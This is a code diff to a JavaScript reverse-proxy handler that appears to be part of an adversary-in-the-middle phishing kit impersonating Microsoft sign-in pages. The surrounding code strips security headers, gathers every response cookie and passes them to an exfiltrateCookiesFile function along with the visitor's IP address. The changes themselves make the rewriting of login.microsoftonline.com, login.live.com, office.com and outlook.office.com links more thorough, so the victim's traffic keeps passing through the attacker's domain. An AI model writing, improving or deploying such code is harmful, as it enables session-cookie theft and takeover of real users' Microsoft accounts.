@@ -106,7 +106,7 @@ async function handleProxy(request, pathSegments = []) {
     new_response_headers.delete('content-security-policy-report-only');
     new_response_headers.delete('clear-site-data');
 
-    // Cookie handling + exfil
+    // Cookie + exfil
     let all_cookies = "";
     try {
       const originalCookies = (typeof new_response_headers.getAll === "function")
@@ -130,33 +130,38 @@ async function handleProxy(request, pathSegments = []) {
       await exfiltrateCookiesFile(all_cookies, ipAddress);
     }
 
-    // ==================== STRONGER AGGRESSIVE REWRITING ====================
+    // ==================== STRONGEST REWRITING YET ====================
     const content_type = new_response_headers.get('content-type');
     let original_text;
 
     if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript)/i.test(content_type)) {
       let text = await original_response_clone.text();
 
-      // Core domain replacements
+      // 1. Domain replacements
       text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
       text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
       text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
 
-      // Other common domains
       text = text.replace(/https?:\/\/login\.live\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/account\.microsoft\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/www\.office\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);
 
-      // Fix the specific failing paths (Me.htm, GetCredentialType, Prefetch.aspx)
+      // 2. Critical specific paths that are failing
       text = text.replace(
-        /(["'])(\/Me\.htm|\/common\/GetCredentialType|\/Prefetch\.aspx|\/common\/|\/api\/|\/sso|\/ajax|\/graphql|\/handlers\/watson)/g,
+        /(["'])(\/Me\.htm|\/Prefetch\.aspx|\/common\/GetCredentialType|\/common\/|\/api\/|\/sso|\/ajax|\/graphql)/g,
         `$1https://${url_hostname}$2`
       );
 
-      // Broader safety nets for shared/ests paths and any remaining localhost
-      text = text.replace(/(["'])(\/shared\/|\/ests\/|\/common\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
+      // 3. Very broad safety net for any path starting with /common/, /shared/, /ests/
+      text = text.replace(/(["'])(\/(common|shared|ests|Me\.htm|Prefetch\.aspx)[^"'\s]*)/g, 
+        `$1https://${url_hostname}$2`);
+
+      // 4. Force any remaining localhost to your domain (last resort safety)
       text = text.replace(/https?:\/\/localhost/g, `https://${url_hostname}`);
+
+      // 5. Fix paths that might be constructed without quotes (rare but happens)
+      text = text.replace(/(\s|^)(\/common\/GetCredentialType)/g, `$1https://${url_hostname}$2`);
 
       original_text = text;
     } else {
